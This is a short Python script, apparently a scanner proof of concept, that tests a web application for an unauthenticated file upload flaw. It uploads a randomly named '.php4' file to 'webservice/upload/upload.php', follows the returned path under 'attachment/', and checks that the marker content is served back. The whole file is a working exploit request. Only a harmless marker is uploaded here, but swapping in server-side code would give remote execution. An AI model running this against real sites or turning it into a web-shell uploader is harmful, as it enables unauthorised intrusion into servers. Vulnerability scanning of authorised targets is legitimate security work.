import requests,re,urllib3
from hashlib import md5
import base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r1=randomLowercase(6)
rand=randomInt(1000,9999)
def scan(baseurl):
	url=baseurl+"webservice/upload/upload.php"
	headers = {
			'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
			'Accept-Encoding': 'gzip, deflate, br',
			'Content-Type': 'multipart/form-data; boundary=--------------------------553898708333958420021355'
		}
	data = f'''----------------------------553898708333958420021355\r
Content-Disposition: form-data; name="file"; filename="{r1}.php4"\r
Content-Type: application/octet-stream\r
\r
{rand}{r1}\r
----------------------------553898708333958420021355--'''
	response = requests.post(url=url,headers=headers,data=data,verify=False,timeout=15)
	filepath=response.text.strip().replace('*','/')
	url=baseurl+f'attachment/{filepath}'
	headers = {
			'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
		}
	response = requests.get(url=url,headers=headers,verify=False,timeout=15)
	if str(rand)+r1 in response.text:
		return True
	else:
		return False
